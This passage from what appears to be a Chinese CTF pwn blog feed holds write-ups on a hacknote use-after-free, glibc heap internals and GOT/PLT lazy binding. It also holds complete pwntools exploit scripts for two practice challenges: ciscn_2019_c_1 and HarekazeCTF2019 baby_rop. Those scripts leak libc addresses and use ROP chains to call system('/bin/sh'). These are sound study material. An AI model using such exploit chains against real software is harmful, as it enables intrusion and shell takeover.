flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h4><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>下面介绍这个exp的原理</p><p>在delete 0和1之后fastbin结构如下图</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;第 1 页\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div><script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script><p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p><p>chunk C、D是<code>note[1]</code>的空间</p><p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p><p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p><p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p><p>理论是如此，下面用gdb验证一下</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>在ida中可以看到notelist的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure><p>查看三次notelist的内容，</p><p><img src="/img/UAF/1.jpg"></p><p><img src="/img/UAF/2.jpg"></p><p><img src="/img/UAF/3.jpg"></p><p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p><p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap Exploitation</title>
    <link href="/2022/11/18/heap%20exploitation/"/>
    <url>/2022/11/18/heap%20exploitation/</url>
    
    <content type="html"><![CDATA[<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>size = 0时，返回系统允许的最小内存块</p><p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p><p>不开ASLR，初始时都指向bss段末尾（end_data)</p><p>开启ASLR，会随机向后偏移一段距离</p><p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p><p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytes，including overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p><p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p><p><code>userdata</code>：数据</p><p>（下一个chunk的prevsize也会存储userdata）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure><p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p><p><code>size</code>：同上</p><p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p><p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p><h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;第 1 页\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p><p>大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p><p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p><h3 id="内存分配流程"><a href="#内存分配流程" class="headerlink" title="内存分配流程"></a>内存分配流程</h3><p> <img src="/img/heapexploitation/1.jpg"></p><h3 id="内存释放流程"><a href="#内存释放流程" class="headerlink" title="内存释放流程"></a>内存释放流程</h3><p> <img src="/img/heapexploitation/2.jpg"></p><p><a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p><p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc 内存管理 ptmalloc 源代码分析</a></p><p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP ciscn_2019_c_1</title>
    <link href="/2022/11/16/ROP%20ciscn_2019_c_1/"/>
    <url>/2022/11/16/ROP%20ciscn_2019_c_1/</url>
    
    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()<span class="hljs-comment">#接收字符串Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#加密后的密文</span><br><span class="hljs-comment">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#得到 puts 函数 的地址</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#计算偏移量</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#计算函数system的地址</span><br> <br><span class="hljs-comment">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   再一次执行 一遍流程</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HarekazeCTF2019 baby_rop</title>
    <link href="/2022/11/16/HarekazeCTF2019baby_rop/"/>
    <url>/2022/11/16/HarekazeCTF2019baby_rop/</url>
    
    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>从给定libc获取获取基址</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOT表和PLT表</title>
    <link href="/2022/11/16/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
    <url>/2022/11/16/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>Linux 动态链接与延迟绑定机制</p><p><strong>Q：</strong></p><ol><li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li><li>何为延迟绑定？</li></ol><h2 id="Linux-动态链接与延迟绑定机制"><a href="#Linux-动态链接与延迟绑定机制" class="headerlink" title="Linux 动态链接与延迟绑定机制"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p><p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p><p>​    因此，需要在调用前加入一个寻找函数地址的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure><p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p><p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p><p>​    后文会具体分析其机制</p><h5 id="实验参考"><a href="#实验参考" class="headerlink" title="实验参考"></a>实验参考</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and 